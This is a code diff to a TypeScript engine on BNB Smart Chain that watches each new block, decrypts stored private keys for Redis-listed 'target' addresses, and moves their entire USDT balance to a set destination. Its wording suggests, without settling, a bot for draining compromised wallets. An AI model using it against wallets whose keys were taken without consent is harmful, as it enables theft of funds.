@@ -1,6 +1,6 @@
-import { createPublicClient, createWalletClient, webSocket, http, fallback, formatEther } from 'viem';
+import { createPublicClient, createWalletClient, webSocket, http, fallback, parseAbi, formatUnits } from 'viem';
 import { privateKeyToAccount } from 'viem/accounts';
-import { bsc } from 'viem/chains'; // Configured for BNB Smart Chain
+import { bsc } from 'viem/chains';
 import * as dotenv from 'dotenv';
 import { redis } from '../config/db';
 import { decryptKey } from './encryption';
@@ -26,8 +26,17 @@ const broadcastClient = createWalletClient({
     transport: fallback(httpTransports)
 });
 
+// Standard BEP-20 / ERC-20 ABI for balance check and transfer
+const ERC20_ABI = parseAbi([
+    'function balanceOf(address account) view returns (uint256)',
+    'function transfer(address recipient, uint256 amount) returns (boolean)'
+]);
+
+// BNB Chain USDT Contract Address
+const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955' as `0x${string}`;
+
 export const startSweeperEngine = async () => {
-    console.log(`⚡️ Execution Engine Online on BNB Chain: Watching with ${wssUrls.length} RPC providers...`);
+    console.log(`⚡️ Token Sweeper Engine Online on BNB Chain: Monitoring USDT...`);
 
     publicClient.watchBlocks({
         onBlock: async (block) => {
@@ -38,8 +47,17 @@ export const startSweeperEngine = async () => {
                 await Promise.all(keys.map(async (redisKey) => {
                     const targetAddress = redisKey.split(':')[1] as `0x${string}`;
                     
-                    const balance = await publicClient.getBalance({ address: targetAddress });
-                    if (balance === 0n) return;
+                    // 1. Check USDT Token Balance instead of native BNB
+                    const usdtBalance = await publicClient.readContract({
+                        address: USDT_CONTRACT,
+                        abi: ERC20_ABI,
+                        functionName: 'balanceOf',
+                        args: [targetAddress],
+                    });
+
+                    if (usdtBalance === 0n) return; // No USDT, skip
+
+                    console.log(`🎯 USDT Detected! Balance: ${formatUnits(usdtBalance, 18)} on ${targetAddress}`);
 
                     const targetData = await redis.hgetall(redisKey);
                     if (!targetData || !targetData.encryptedKey) return;
@@ -48,26 +66,33 @@ export const startSweeperEngine = async () => {
                     const account = privateKeyToAccount(privateKey);
                     const destination = targetData.destination as `0x${string}`;
 
+                    // 2. Check Native BNB Gas Balance
+                    const bnbBalance = await publicClient.getBalance({ address: targetAddress });
                     const gasPrice = await publicClient.getGasPrice();
-                    const gasLimit = 21000n;
+                    const gasLimit = 65000n; // Standard ERC-20 transfer gas limit
                     const txFee = gasPrice * gasLimit;
 
-                    if (balance <= txFee) return;
+                    if (bnbBalance < txFee) {
+                        console.log(`⚠️ Target ${targetAddress} has USDT but lacks BNB gas (${formatUnits(bnbBalance, 18)} BNB). Skipping or needs gas feeder.`);
+                        return; 
+                    }
 
-                    const sweepAmount = balance - txFee;
-
-                    const txHash = await broadcastClient.sendTransaction({
+                    // 3. Execute Token Sweep Transaction
+                    const { request } = await publicClient.simulateContract({
                         account,
-                        to: destination,
-                        value: sweepAmount,
-                        gas: gasLimit,
-                        gasPrice: gasPrice,
+                        address: USDT_CONTRACT,
+                        abi: ERC20_ABI,
+                        functionName: 'transfer',
+                        args: [destination, usdtBalance],
                     });
 
-                    console.log(`✅ SWEPT! Sent ${formatEther(sweepAmount)} BNB to ${destination}. TX: ${txHash}`);
+                    const txHash = await broadcastClient.writeContract(request);
+
+                    console.log(`✅ USDT SWEPT SUCCESSFULLY! Sent ${formatUnits(usdtBalance, 18)} USDT to ${destination}. TX: ${txHash}`);
+                    
                 }));
             } catch (error) {
-                console.error("[Engine Error] Block processing failed:", error);
+                console.error("[Engine Error] Token sweep failed:", error);
             }
         }
     });
